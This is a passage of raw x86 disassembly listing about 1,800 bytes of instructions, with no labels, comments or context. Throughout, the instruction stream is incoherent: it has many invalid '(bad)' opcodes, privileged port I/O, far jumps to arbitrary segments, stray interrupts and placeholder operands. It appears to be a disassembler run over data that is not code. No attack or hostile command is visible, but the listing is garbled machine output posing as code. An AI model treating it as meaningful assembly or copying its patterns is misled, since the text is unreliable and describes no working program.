  41219e:	cdq    
  41219f:	sbb    dl,BYTE PTR [ebx]
  4121a1:	pop    edi
  4121a2:	nop
  4121a3:	adc    eax,0x53cc8e23
  4121a8:	cs xchg ebp,eax
  4121aa:	ja     0x4121b3
  4121ac:	pop    ecx
  4121ad:	dec    edx
  4121ae:	ror    BYTE PTR [edx+0x6e7b493e],1
  4121b4:	jg     0x4121f1
  4121b6:	jo     0x412188
  4121b8:	bound  esi,QWORD PTR [ebx-0x48c1427]
  4121be:	mov    ds:0xa5e97aef,al
  4121c3:	in     al,dx
  4121c4:	xor    dl,BYTE PTR [ecx+eax*4-0x7ce69cb2]
  4121cb:	out    0x9f,al
  4121cd:	jge    0x41217b
  4121cf:	pcmpgtd mm7,QWORD PTR [edi+0x69aacab]
  4121d6:	mov    BYTE PTR [edi],0xdd
  4121d9:	pop    ds
  4121da:	imul   eax,esi,0xc012b3c2
  4121e0:	sbb    bl,al
  4121e2:	push   0xa2c0e586
  4121e7:	sti    
  4121e8:	push   cs
  4121e9:	sti    
  4121ea:	mov    eax,ds:0xd2e73ae1
  4121ef:	ss cmp eax,0xe1e4e3f8
  4121f5:	or     eax,0x1c296528
  4121fa:	nop    DWORD PTR [ebx+0x7320c09b]
  412201:	out    dx,eax
  412202:	data16 adc BYTE PTR [eax-0x46],dl
  412206:	int3   
  412207:	fadd   DWORD PTR [ebx]
  412209:	icebp  
  41220a:	xchg   esp,eax
  41220b:	sub    ah,BYTE PTR [eax+0x887381a]
  412211:	add    edx,0x24
  412214:	rol    DWORD PTR [edi],cl
  412216:	ds mov edi,0x97f2a426
  41221c:	verr   WORD PTR [ebx+edi*8+0x4032c2a0]
  412224:	and    eax,0xc45b8b57
  412229:	(bad)  
  41222a:	xchg   edi,eax
  41222b:	ficomp DWORD PTR [esi+0x55baf514]
  412231:	push   eax
  412232:	push   0xfffffff8
  412234:	and    al,0xdf
  412236:	das    
  412237:	fldcw  WORD PTR [ebp+0x514d5d75]
  41223d:	into   
  41223e:	dec    esi
  41223f:	jl     0x4121f0
  412241:	scas   al,BYTE PTR es:[edi]
  412242:	int    0xb6
  412244:	stos   BYTE PTR es:[edi],al
  412245:	outs   dx,DWORD PTR ds:[esi]
  412246:	fimul  DWORD PTR [ebp+edi*2+0x623c60b9]
  41224d:	daa    
  41224e:	mov    ebx,0xe4999814
  412253:	cmp    esp,DWORD PTR [esi]
  412255:	pop    DWORD PTR [ebp+0x66]
  412258:	jle    0x41224d
  41225a:	sub    DWORD PTR [esi-0x4a],0xffffffc3
  41225e:	arpl   WORD PTR [ecx-0x79c7f46d],sp
  412264:	and    BYTE PTR [ecx],ch
  412266:	pop    ebp
  412267:	(bad)  
  412268:	xlat   BYTE PTR ds:[ebx]
  412269:	sub    al,dh
  41226b:	mov    eax,ds:0x294c2540
  412270:	mov    ch,0x7f
  412272:	test   edi,0xd5285b98
  412278:	fimul  WORD PTR [eax-0x64]
  41227b:	xchg   ebx,eax
  41227c:	jecxz  0x412228
  41227e:	mov    edi,0x7c603b77
  412283:	fs stos BYTE PTR es:[edi],al
  412285:	cmp    esp,DWORD PTR [edi+0x74fed520]
  41228b:	(bad)  
  41228c:	lock jecxz 0x41228f
  41228f:	imul   esi,DWORD PTR [ecx+eiz*2-0x6b],0xcb6d62ed
  412297:	mov    al,0x42
  412299:	out    0x14,eax
  41229b:	and    al,0xa4
  41229d:	(bad)  
  41229e:	shl    BYTE PTR [ecx-0x66677e54],1
  4122a4:	jge    0x412264
  4122a6:	fwait
  4122a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122a8:	cdq    
  4122a9:	aaa    
  4122aa:	pop    ds
  4122ab:	int    0x86
  4122ad:	fwait
  4122ae:	jae    0x412265
  4122b0:	arpl   WORD PTR [ebx],cx
  4122b2:	sti    
  4122b3:	push   ds
  4122b4:	dec    ebx
  4122b5:	cmc    
  4122b6:	or     al,BYTE PTR [edx+0x7f]
  4122b9:	adc    al,0xa9
  4122bb:	sub    eax,eax
  4122bd:	push   esp
  4122be:	push   DWORD PTR [ebx+0x1487a261]
  4122c4:	xchg   edi,eax
  4122c5:	add    eax,0x7a1d4555
  4122ca:	aaa    
  4122cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122cc:	cmp    eax,0xda6693de
  4122d1:	je     0x4122b7
  4122d3:	leave  
  4122d4:	dec    edx
  4122d5:	mov    ecx,0x386b7f1
  4122da:	push   0xffffff8d
  4122dc:	jge    0x4122ea
  4122de:	pop    ebp
  4122df:	sub    edi,DWORD PTR [ebp+0x788e9d5e]
  4122e5:	or     al,0xac
  4122e7:	mov    DWORD PTR [ecx-0x7a],edi
  4122ea:	add    al,BYTE PTR [edx-0x23d27a36]
  4122f0:	and    ch,ah
  4122f2:	clc    
  4122f3:	mov    eax,0x4fa992d5
  4122f8:	leave  
  4122f9:	cmp    bl,ah
  4122fb:	mov    esi,0xbaac91fc
  412300:	cmp    al,0xfa
  412302:	jno    0x412306
  412304:	ss repz adc al,0xdb
  412308:	add    eax,0xfd8af94b
  41230d:	nop
  41230e:	adc    bl,BYTE PTR [ecx+0x3d]
  412311:	rcl    BYTE PTR [edi],0xf2
  412314:	repnz and al,0x47
  412317:	rcl    BYTE PTR [ecx+0x70],1
  41231a:	cmp    esi,ecx
  41231c:	cmp    BYTE PTR [ebx+0x75],cl
  41231f:	popa   
  412320:	pop    edi
  412321:	in     al,0x31
  412323:	and    DWORD PTR [edx+edi*4-0x25f83b75],edi
  41232a:	jg     0x4122d1
  41232c:	or     DWORD PTR [ecx+0x12],0x1d2fc3a9
  412333:	(bad)  
  412334:	mov    cl,0x3a
  412336:	mov    ?,esi
  412338:	push   ecx
  412339:	nop
  41233a:	test   bh,ah
  41233c:	xchg   ebx,eax
  41233d:	sahf   
  41233e:	cmp    DWORD PTR [ecx+0x1921646e],ebp
  412344:	cmp    al,BYTE PTR ds:0x2e6db5ad
  41234a:	mov    ds:0x857a34d5,al
  41234f:	(bad)  
  412350:	mov    ecx,0xd245d07e
  412355:	dec    eax
  412356:	stos   DWORD PTR es:[edi],eax
  412357:	js     0x412369
  412359:	scas   eax,DWORD PTR es:[edi]
  41235a:	in     al,0x75
  41235c:	jl     0x412375
  41235e:	mov    ds:0x567b190,al
  412363:	mov    esp,0x891f29e9
  412368:	jne    0x41234e
  41236a:	sbb    al,0xe2
  41236c:	inc    edi
  41236d:	add    al,0x91
  41236f:	imul   WORD PTR [ecx-0x1dc97587]
  412376:	sbb    al,0xd9
  412378:	cmp    al,0x36
  41237a:	dec    edi
  41237b:	xchg   ebp,eax
  41237c:	(bad)  
  41237d:	adc    edx,DWORD PTR [ebx-0x67]
  412380:	mov    eax,0xab6dbf01
  412385:	loope  0x4123ae
  412387:	mov    dl,0xa0
  412389:	addr16 cli 
  41238b:	nop
  41238c:	jns    0x4123f7
  41238e:	inc    ebp
  41238f:	xor    eax,0xc35bff3e
  412394:	inc    ebp
  412395:	dec    edi
  412396:	inc    edx
  412397:	(bad)  
  412398:	in     al,0x78
  41239a:	mov    edi,0x388bd3b2
  41239f:	pop    edi
  4123a0:	jbe    0x4123f0
  4123a2:	add    ch,BYTE PTR [esp+ebx*2]
  4123a5:	jbe    0x4123f4
  4123a7:	cmp    eax,0x76dd5659
  4123ac:	pop    ecx
  4123ad:	adc    eax,0xf876d5fa
  4123b2:	adc    DWORD PTR [esi],eax
  4123b4:	jbe    0x4123ab
  4123b6:	pop    ss
  4123b7:	fisttp DWORD PTR [ecx]
  4123b9:	adc    al,0x4c
  4123bc:	push   ss
  4123bd:	mov    edi,ds
  4123bf:	in     eax,dx
  4123c0:	int3   
  4123c1:	shl    BYTE PTR [esp+ecx*4],1
  4123c4:	inc    edi
  4123c5:	(bad)  
  4123c6:	sbb    DWORD PTR [ebx-0x3955ad5b],edi
  4123cc:	pop    eax
  4123cd:	ds xchg edx,eax
  4123cf:	(bad)
  4123d3:	mov    bl,0xe
  4123d5:	sub    eax,0x813ca3d9
  4123da:	mov    ebx,0xd90115b3
  4123df:	xor    al,0x5b
  4123e1:	call   0xdf09:0x4b443d5d
  4123e8:	idiv   BYTE PTR ds:0xbba117c1
  4123ee:	cmp    DWORD PTR [edx-0x3a16f88a],ebx
  4123f4:	sbb    ecx,ecx
  4123f6:	sub    esi,edi
  4123f8:	loope  0x41241e
  4123fa:	sub    eax,0xa590da8f
  4123ff:	ins    BYTE PTR es:[edi],dx
  412400:	hlt    
  412401:	daa    
  412402:	push   esi
  412403:	(bad)  
  412404:	rol    al,1
  412406:	fsub   st,st(0)
  412408:	dec    esp
  412409:	call   0xc296169e
  41240e:	add    al,0x1
  412410:	(bad)  
  412411:	int    0x26
  412413:	jne    0x41240b
  412415:	xchg   edx,eax
  412416:	jecxz  0x4123d9
  412418:	lods   eax,DWORD PTR ds:[esi]
  412419:	dec    eax
  41241a:	push   cs
  41241b:	mov    ds:0x6a146b5d,al
  412420:	loopne 0x412440
  412422:	push   eax
  412423:	retf   0x35e7
  412426:	fild   QWORD PTR [edi]
  412428:	xchg   ebp,eax
  412429:	jmp    0x4abf852b
  41242e:	icebp  
  41242f:	adc    eax,0x5d7d5dfc
  412434:	jg     0x4124a2
  412436:	fcom   QWORD PTR [ebp-0x373fa880]
  41243c:	icebp  
  41243d:	addr16 cmc 
  41243f:	bnd jl 0x412442
  412442:	pop    ebx
  412443:	test   al,0xda
  412445:	fs dec ecx
  412447:	sbb    eax,0x76d52e64
  41244c:	leave  
  41244d:	scas   al,BYTE PTR es:[edi]
  41244e:	and    BYTE PTR [eax],cl
  412450:	jmp    0xa7c8:0xaa648f46
  412457:	dec    ecx
  412458:	pop    ecx
  412459:	or     ch,BYTE PTR [ebp-0x48]
  41245c:	dec    BYTE PTR [ecx]
  41245e:	call   0x42ac:0xdda41db7
  412465:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  412468:	push   ecx
  412469:	jb     0x41245a
  41246b:	out    0x7e,al
  41246d:	aam    0x94
  41246f:	inc    ecx
  412470:	push   esp
  412471:	bound  ebx,QWORD PTR [ebx+0x2b]
  412474:	or     BYTE PTR [esi],bh
  412476:	mov    bl,0x96
  412478:	jo     0x4124aa
  41247a:	jge    0x412467
  41247c:	or     al,0xe8
  41247e:	mov    cl,0x25
  412481:	add    ecx,0xa
  412484:	nop
  412485:	push   edi
  412486:	out    dx,al
  412487:	xor    al,0x1f
  412489:	sub    ah,0xed
  41248c:	lods   eax,DWORD PTR ds:[esi]
  41248d:	xor    DWORD PTR [esi],edx
  41248f:	jl     0x412421
  412491:	outs   dx,DWORD PTR ds:[esi]
  412492:	shl    ah,cl
  412494:	sahf   
  412495:	jp     0x4124eb
  412497:	pop    ecx
  412498:	fdivr  DWORD PTR [edx+0x47c24034]
  41249e:	out    dx,al
  41249f:	xlat   BYTE PTR ds:[ebx]
  4124a0:	push   esp
  4124a1:	ror    DWORD PTR [ebp+0x33],0x4a
  4124a5:	sub    eax,0xe42056d1
  4124aa:	fdiv   QWORD PTR ds:0x91f5b42f
  4124b0:	rcl    bh,1
  4124b2:	aad    0x75
  4124b4:	jb     0x41246b
  4124b6:	xchg   ecx,eax
  4124b7:	fadd   QWORD PTR [esi-0x2225df33]
  4124bd:	mov    dh,0xf
  4124bf:	inc    ebp
  4124c0:	lods   eax,DWORD PTR ds:[esi]
  4124c1:	ret    
  4124c2:	arpl   WORD PTR [ebx+0x52],ax
  4124c5:	or     ch,cl
  4124c7:	mov    ah,0x82
  4124c9:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124cb:	inc    ebx
  4124cc:	daa    
  4124cd:	fwait
  4124ce:	push   0xffffff98
  4124d0:	sbb    edi,ecx
  4124d2:	jg     0x41254f
  4124d4:	adc    al,0x7e
  4124d6:	jae    0x41251e
  4124d8:	inc    edx
  4124d9:	cmc    
  4124da:	dec    edi
  4124db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124dc:	rcr    DWORD PTR [esp+esi*8],1
  4124df:	lea    ecx,[edx+0xe41d297]
  4124e5:	pop    ss
  4124e6:	or     ecx,DWORD PTR [ebx]
  4124e8:	inc    ebx
  4124e9:	stc    
  4124ea:	outs   dx,BYTE PTR ds:[esi]
  4124eb:	mov    ch,0x97
  4124ed:	repnz xor esp,edi
  4124f0:	(bad)  
  4124f2:	cld    
  4124f3:	adc    bh,BYTE PTR gs:[ebx-0x61]
  4124f7:	mov    ah,0x65
  4124f9:	mov    eax,ds:0xa6dacb33
  4124fe:	call   0x8f7b:0x8f015e9f
  412505:	push   esi
  412506:	push   edi
  412507:	ja     0x41251e
  412509:	or     eax,0x85f62ee3
  41250e:	inc    eax
  41250f:	and    DWORD PTR [ebp-0x5df6ebba],ecx
  412515:	shl    ebx,1
  412517:	dec    edi
  412518:	in     al,dx
  412519:	lock int3 
  41251b:	jl     0x4124f8
  41251d:	je     0x412541
  41251f:	stos   BYTE PTR es:[edi],al
  412520:	sub    DWORD PTR [eax],esi
  412522:	loop   0x412572
  412524:	sahf   
  412525:	xor    edi,DWORD PTR [ebx]
  412527:	mov    BYTE PTR [esi-0x74dc9723],ch
  41252d:	xor    al,0xad
  41252f:	adc    DWORD PTR [edx+0x1d90706f],esi
  412535:	cli    
  412536:	inc    eax
  412537:	dec    ebx
  412538:	leave  
  412539:	dec    ecx
  41253a:	inc    esi
  41253b:	push   esp
  41253c:	iret   
  41253d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41253e:	cmp    eax,0x2ddd60d0
  412543:	push   0x86c0363f
  412548:	cmp    BYTE PTR [eax-0x4a],cl
  41254b:	push   es
  41254c:	mov    WORD PTR [eax-0x67a0c054],ds
  412552:	adc    cl,cl
  412554:	jmp    0x41254b
  412556:	(bad)  
  412557:	test   eax,0x975be6b9
  41255c:	mov    ecx,0x440d026e
  412561:	dec    edx
  412562:	bound  eax,QWORD PTR [edx+ebp*4+0x3693e32d]
  412569:	add    DWORD PTR [ebx-0x1b83ada1],edi
  41256f:	mov    dl,0xfa
  412571:	mov    ds:0xf816d3ab,eax
  412576:	xchg   ebp,eax
  412577:	add    dl,BYTE PTR [esi+0x802ab06]
  41257d:	cmp    bh,BYTE PTR [edi+0x78b5efbb]
  412583:	(bad)  
  412584:	push   ecx
  412585:	call   0xaea6:0xce28a61c
  41258c:	into   
  41258d:	leave  
  41258e:	dec    esp
  41258f:	push   ss
  412590:	mov    al,ds:0xee75b4dc
  412595:	push   ebp
  412596:	nop
  412597:	les    edi,FWORD PTR [eax-0xe60624a]
  41259d:	jb     0x4125b7
  41259f:	rol    DWORD PTR [ebx],1
  4125a1:	popf   
  4125a2:	add    dh,ch
  4125a4:	add    al,0xe3
  4125a6:	aam    0xbd
  4125a8:	mov    al,0xa3
  4125aa:	gs stos BYTE PTR es:[edi],al
  4125ac:	imul   esi,DWORD PTR [edi],0xffffffe5
  4125af:	loope  0x41258b
  4125b1:	mov    esp,0xc4586305
  4125b6:	xor    DWORD PTR ds:0xcdd2bec,ecx
  4125bc:	je     0x412602
  4125be:	adc    dl,0xed
  4125c1:	or     al,0x43
  4125c3:	jmp    0xb3c24cab
  4125c8:	(bad)  
  4125c9:	jae    0x412606
  4125cb:	cmp    eax,0xaab02853
  4125d0:	arpl   WORD PTR [ebx],ax
  4125d2:	add    eax,0x500cd08f
  4125d7:	mov    al,ds:0x20f5e722
  4125dc:	das    
  4125dd:	jecxz  0x4125d1
  4125df:	std    
  4125e0:	push   edi
  4125e1:	scas   eax,DWORD PTR es:[edi]
  4125e2:	ins    DWORD PTR es:[edi],dx
  4125e3:	sub    al,0x17
  4125e5:	jns    0x4125a8
  4125e7:	xchg   esi,eax
  4125e8:	jp     0x41259b
  4125ea:	fidiv  DWORD PTR [edi+0x6a3373c6]
  4125f0:	push   ebx
  4125f1:	add    dh,bh
  4125f3:	mov    DWORD PTR [edi+0x12],esi
  4125f6:	or     ebx,edi
  4125f8:	sub    BYTE PTR [ecx+0x14d7a35e],bl
  4125fe:	mov    ch,0x29
  412600:	mov    ch,0xf9
  412602:	popf   
  412603:	push   eax
  412604:	loope  0x412649
  412606:	into   
  412607:	retf   0x1bc0
  41260a:	(bad)  
  41260b:	repz pop esp
  41260d:	mov    cl,0xe7
  41260f:	jne    0x412640
  412611:	adc    DWORD PTR [eax+0x5c],ebx
  412614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412615:	lods   al,BYTE PTR ds:[esi]
  412616:	into   
  412617:	xchg   edx,eax
  412618:	sti    
  412619:	fstp   DWORD PTR [esi-0x47]
  41261c:	sub    ah,BYTE PTR [esi-0x42]
  41261f:	lds    eax,FWORD PTR [eax+0x5c]
  412622:	test   DWORD PTR [edx+edx*4-0x7378748],esp
  412629:	scas   al,BYTE PTR es:[edi]
  41262a:	mov    al,0x62
  41262c:	dec    edi
  41262d:	aad    0x87
  41262f:	sbb    BYTE PTR [esi+esi*1+0x72c08586],ch
  412636:	cmc    
  412637:	push   ecx
  412638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412639:	push   ecx
  41263a:	mov    ch,al
  41263c:	js     0x41268a
  41263e:	lock rcr dl,1
  412641:	add    dl,BYTE PTR [esi+0x2f]
  412644:	rol    ah,0xfe
  412647:	mov    ecx,0x47720c4d
  41264c:	mov    DWORD PTR [ebx],0x3b682866
  412652:	(bad)  
  412653:	call   0x57595c1
  412658:	(bad)  
  412659:	cld    
  41265a:	stc    
  41265b:	sbb    eax,ebx
  41265d:	jo     0x4125f3
  41265f:	inc    edx
  412660:	mov    ebp,0x21feface
  412665:	jp     0x41260c
  412667:	addr16 push edi
  412669:	xor    ch,BYTE PTR ds:0x9baa3499
  41266f:	mov    bl,0x27
  412671:	pop    edi
  412672:	pop    ss
  412673:	mov    dh,0x60
  412675:	ins    BYTE PTR es:[edi],dx
  412676:	add    DWORD PTR [ebx+0x6a],esi
  412679:	sub    esi,edi
  41267b:	out    dx,al
  41267c:	sub    ebx,DWORD PTR [ebx+0x2261eede]
  412682:	jle    0x412659
  412684:	(bad)  
  412685:	and    al,0xdf
  412687:	stos   BYTE PTR es:[edi],al
  412688:	fwait
  412689:	or     al,0xe2
  41268b:	cmp    BYTE PTR [ebp+0x11b2d722],cl
  412691:	arpl   WORD PTR [edx],bp
  412693:	mov    ah,0xf4
  412695:	retf   
  412696:	ins    BYTE PTR es:[edi],dx
  412697:	imul   esp,edx,0x7f
  41269a:	je     0x412643
  41269c:	test   eax,0x469120e5
  4126a1:	mov    WORD PTR [edx+0x1839d350],?
  4126a7:	rcr    ebp,cl
  4126a9:	pop    esp
  4126aa:	ja     0x412639
  4126ac:	lea    esp,[edi+0x444b7437]
  4126b2:	sub    bh,0x4d
  4126b5:	xchg   esp,eax
  4126b6:	sub    eax,0xb9b48611
  4126bb:	ds in  al,dx
  4126bd:	adc    edi,edx
  4126bf:	inc    ebp
  4126c0:	out    0xc6,eax
  4126c2:	pop    edi
  4126c3:	xor    DWORD PTR [eax],esi
  4126c5:	add    eax,0xc2cf2c32
  4126ca:	fdiv   DWORD PTR [eax-0x35]
  4126cd:	pop    edx
  4126ce:	push   esp
  4126cf:	stos   DWORD PTR es:[edi],eax
  4126d0:	popa   
  4126d1:	jl     0x4126a3
  4126d3:	jmp    0xd777:0x80d3cad8
  4126da:	sbb    al,dl
  4126dc:	cmp    BYTE PTR [ebp-0x6c],0x5c
  4126e0:	ret    
  4126e1:	cli    
  4126e2:	push   ecx
  4126e3:	cmp    DWORD PTR [ecx-0x36],esi
  4126e6:	loop   0x4126af
  4126e8:	jne    0x4126bc
  4126ea:	stos   BYTE PTR es:[edi],al
  4126eb:	jb     0x4126e5
  4126ed:	fwait
  4126ee:	retf   
  4126ef:	sbb    DWORD PTR [ecx+0x5d19bafd],eax
  4126f5:	xchg   edi,eax
  4126f6:	popf   
  4126f7:	retf   
  4126f8:	mov    dh,0xd
  4126fa:	cwde   
  4126fb:	mov    cl,0x73
  4126fd:	lods   eax,DWORD PTR ds:[esi]
  4126fe:	jae    0x4126ae
  412700:	mov    cl,cl
  412702:	fbstp  TBYTE PTR [edi]
  412704:	adc    ecx,DWORD PTR [esi+ebx*4+0x5d]
  412708:	push   ecx
  412709:	mov    gs,WORD PTR [edx-0x80]
  41270c:	add    dl,BYTE PTR [ebp-0x64]
  41270f:	out    0x59,al
  412711:	leave  
  412712:	lahf   
  412713:	(bad)  
  412714:	test   DWORD PTR [edx*4-0x133806f4],0xc9d1226f
  41271f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412720:	xor    eax,0x972fff2b
  412725:	xchg   esi,eax
  412726:	xor    edx,ebx
  412728:	and    DWORD PTR ds:0xdc51389f,edi
  41272e:	stos   BYTE PTR es:[edi],al
  41272f:	and    esi,DWORD PTR [ecx+eiz*2-0x31]
  412733:	mov    ds:0x798149a7,eax
  412738:	fs jnp 0x412771
  41273b:	pop    eax
  41273c:	(bad)  
  41273d:	retf   
  41273e:	mov    al,0x87
  412740:	mov    cl,0x40
  412742:	sub    al,0x88
  412744:	xchg   BYTE PTR [esi-0x29ffbd59],cl
  41274a:	mov    dh,0x3e
  41274c:	mov    bl,0x95
  41274e:	imul   DWORD PTR [edi]
  412750:	iret   
  412751:	mov    es,WORD PTR [eax]
  412753:	dec    ecx
  412754:	push   ecx
  412755:	jbe    0x41279c
  412757:	sub    DWORD PTR [edi+0x13],ebp
  41275a:	int3   
  41275b:	pop    eax
  41275c:	lods   al,BYTE PTR ds:[esi]
  41275d:	in     al,0xd9
  41275f:	mov    eax,0xad403cc
  412764:	add    edi,DWORD PTR [ecx]
  412766:	xchg   BYTE PTR [ebx+0x7a],ah
  412769:	cmp    DWORD PTR [esi+esi*2],edi
  41276c:	jno    0x4126f8
  41276e:	je     0x412715
  412770:	push   ebp
  412771:	sub    al,0x84
  412773:	inc    ebx
  412774:	inc    edi
  412775:	jmp    0xb6b337f4
  41277a:	cwde   
  41277b:	mov    ebx,0x28295a27
  412780:	mov    ch,0xe3
  412782:	out    0xd,eax
  412784:	outs   dx,DWORD PTR ds:[esi]
  412785:	ret    0x4228
  412788:	retf   0x2693
  41278b:	dec    esp
  41278c:	dec    ebx
  41278d:	xor    cl,dh
  41278f:	jp     0x41275c
  412791:	popa   
  412792:	clc    
  412793:	lahf   
  412794:	shr    BYTE PTR [edx-0x25],0x2d
  412798:	imul   ecx,DWORD PTR [eax+edx*4],0x3b
  41279c:	sar    esp,1
  41279e:	push   0x5c241203
  4127a3:	retf   
  4127a4:	jle    0x41281a
  4127a6:	stc    
  4127a7:	and    ebp,DWORD PTR [ebx+ebp*8+0x4c528e5a]
  4127ae:	pop    es
  4127af:	sar    DWORD PTR [edi+0xe],0x78
  4127b3:	add    eax,0x7bfb7c4
  4127b8:	pop    esp
  4127b9:	or     esp,ebx
  4127bb:	adc    DWORD PTR [edx],ecx
  4127bd:	mov    esp,0x78c030d2
  4127c2:	pop    edi
  4127c3:	sbb    BYTE PTR [esi-0x1a],ah
  4127c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127c7:	push   ebx
  4127c8:	mov    ch,0x64
  4127ca:	sub    edx,esp
  4127cc:	mov    ecx,ss
  4127ce:	pop    es
  4127cf:	adc    DWORD PTR [ebp+0x7f],ecx
  4127d2:	cs xchg ecx,eax
  4127d4:	jle    0x412765
  4127d6:	mov    ebx,0xc5934e4
  4127db:	push   ss
  4127dc:	mov    bh,0x5f
  4127de:	call   0xbdbf4f4
  4127e3:	cmp    edi,DWORD PTR [esi]
  4127e5:	fldcw  WORD PTR [ebp+0x65]
  4127e8:	pusha  
  4127e9:	mov    cl,0xa6
  4127eb:	mov    WORD PTR ss:[edx+ebp*2],ss
  4127ef:	mov    al,ds:0xb8c79025
  4127f4:	mov    esp,0xb1eaf4b3
  4127f9:	xchg   esi,edx
  4127fb:	pop    ecx
  4127fc:	sahf   
  4127fd:	or     al,0x92
  4127ff:	outs   dx,DWORD PTR ds:[esi]
  412800:	jl     0x412869
  412802:	adc    BYTE PTR [ecx+0x4a747318],dl
  412808:	jno    0x4127bc
  41280a:	pushf  
  41280b:	aas    
  41280c:	inc    edx
  41280d:	in     al,0x4b
  41280f:	pop    esi
  412810:	pop    ebp
  412811:	out    dx,eax
  412812:	sub    DWORD PTR [ebx],0x78
  412815:	and    esp,ecx
  412817:	or     eax,0x943396fd
  41281c:	mov    al,ds:0x5523efbf
  412821:	ret    0x7925
  412824:	mov    ds:0xb8f91721,al
  412829:	pop    edi
  41282a:	inc    ebx
  41282b:	xor    eax,0xc915b7cd
  412830:	cmp    cl,BYTE PTR [eax+0x6271a349]
  412836:	xchg   esi,ebp
  412838:	push   ecx
  412839:	xchg   esi,eax
  41283a:	imul   edi,DWORD PTR [ecx-0x46],0x455db443
  412841:	rcr    al,cl
  412843:	dec    esi
  412844:	call   0x65b8:0x158b27f1
  41284b:	pop    eax
  41284c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41284d:	scas   eax,DWORD PTR es:[edi]
  41284e:	inc    edi
  41284f:	cmp    dl,0x49
  412852:	push   0xfffffff9
  412854:	loope  0x412850
  412856:	leave  
  412857:	sbb    DWORD PTR [edx],esi
  412859:	mov    ecx,0xe3fd11a8
  41285e:	in     eax,0xd2
  412860:	sub    si,WORD PTR [edx]
  412863:	dec    esp
  412864:	sbb    DWORD PTR [edi],ebx
  412866:	icebp  
  412867:	mov    dh,BYTE PTR [ecx+0x155d8d58]
  41286d:	sar    DWORD PTR [esi+ebx*8-0x7c238f90],cl
  412874:	cs add al,0x6e
  412877:	repz inc esp
  412879:	xor    BYTE PTR [ecx],ah
  41287b:	jecxz  0x41285a
  41287d:	(bad)  
  41287e:	xchg   esp,eax
  41287f:	pushf  
  412880:	shl    DWORD PTR [eax+0x5a],cl
  412883:	mov    ah,0xa6
  412885:	cdq    
  412886:	mov    ebx,DWORD PTR [esi-0x38]
  412889:	pop    esi
  41288a:	pushf  
  41288b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41288c:	mov    ch,BYTE PTR [edx-0x49]
  41288f:	stos   DWORD PTR es:[edi],eax
  412890:	loop   0x41285e
  412892:	mov    ch,0x55
  412894:	dec    esp
  412895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412896:	push   es
  412897:	mov    ds:0x2b2ab4c7,eax
  41289c:	enter  0x971,0x92
  4128a0:	lea    eax,gs:[eax+0x7f]
  4128a4:	mov    ah,BYTE PTR [ebp+0x2dd4e99c]
  4128aa:	out    0x38,eax
  4128ac:	sbb    DWORD PTR [ebx-0x802dfc3],ecx
  4128b2:	cmp    edi,ebp
  4128b4:	fisubr WORD PTR [ebp+0x5c3c8e11]
  4128ba:	aaa    
  4128bb:	jns    0x41283e
  4128bd:	add    ch,BYTE PTR ds:0x16b16b53
  4128c3:	stos   DWORD PTR es:[edi],eax
  4128c4:	sub    ebp,DWORD PTR [ecx]
  4128c6:	idiv   DWORD PTR [ebx+0x57]
  4128c9:	push   ebx
  4128ca:	(bad)  
  4128cb:	jmp    0x412932
  4128cd:	out    0x97,al
  4128cf:	lock in al,0xda
  4128d2:	add    eax,0x97885a37
  4128d7:	ins    BYTE PTR es:[edi],dx
  4128d8:	or     eax,DWORD PTR [ebp+0x4e]
  4128db:	int3   
  4128dc:	das    
  4128dd:	jae    0x4128c7
  4128df:	push   cs
  4128e0:	and    BYTE PTR [ecx],dl
  4128e2:	retf   0x948f
  4128e5:	sbb    al,0x53
  4128e7:	jge    0x412919
  4128e9:	stos   DWORD PTR es:[edi],eax
  4128ea:	sti    
  4128eb:	add    al,0xa8
  4128ed:	jbe    0x412895
  4128ef:	add    DWORD PTR [ecx+0x77],edx
  4128f2:	test   al,0xf
  4128f4:	cmc    
  4128f5:	sbb    eax,0x3e57093
  4128fa:	dec    edx
  4128fb:	jne    0x4128c5
  4128fd:	jb     0x4128cf
  4128ff:	cmp    bl,0xac
  412902:	pop    ebp
  412903:	mov    ds:0x974aba88,al
  412908:	inc    edx
  412909:	out    0xb5,eax
  41290b:	fidiv  DWORD PTR [esi-0x32]
  41290e:	outs   dx,BYTE PTR ds:[esi]
  41290f:	aam    0x33
  412911:	stos   DWORD PTR es:[edi],eax
  412912:	and    edi,DWORD PTR [edx-0x46]
  412915:	or     eax,0x9b1e47ba
  41291a:	(bad)  
  41291c:	repnz xchg ebx,eax
  41291e:	outs   dx,BYTE PTR ds:[esi]
  41291f:	mov    al,ds:0x7a07b3fa
  412924:	sbb    cl,BYTE PTR cs:[edx+0x3a]
  412928:	cmc    
  412929:	test   eax,0x977291eb
  41292e:	jge    0x412971
  412930:	cdq    
  412931:	hlt    
  412932:	dec    ecx
  412933:	ins    DWORD PTR es:[edi],dx
  412934:	jne    0x412919
  412936:	push   eax
  412937:	fistp  WORD PTR [edi+eiz*1-0xf]
  41293b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41293c:	inc    ebp
  41293d:	outs   dx,BYTE PTR ds:[esi]
  41293e:	fld    TBYTE PTR [esi]
  412940:	aam    0x9c
  412942:	xchg   ebx,eax
  412943:	jle    0x41290d
  412945:	mov    dl,0xf6
  412947:	addr16 xchg edi,eax
  412949:	into   
  41294a:	(bad)  
  41294b:	pop    eax
  41294c:	(bad)  
  41294e:	(bad)  
  41294f:	adc    ebx,DWORD PTR [ecx-0x38]
  412952:	ret    
  412953:	outs   dx,BYTE PTR cs:[esi]
  412955:	or     BYTE PTR [ebp+0x652b8f78],dl
  41295b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41295c:	push   di
  41295e:	pop    edi
  41295f:	retf   0xb017
  412962:	jge    0x412985
  412964:	das    
  412965:	popa   
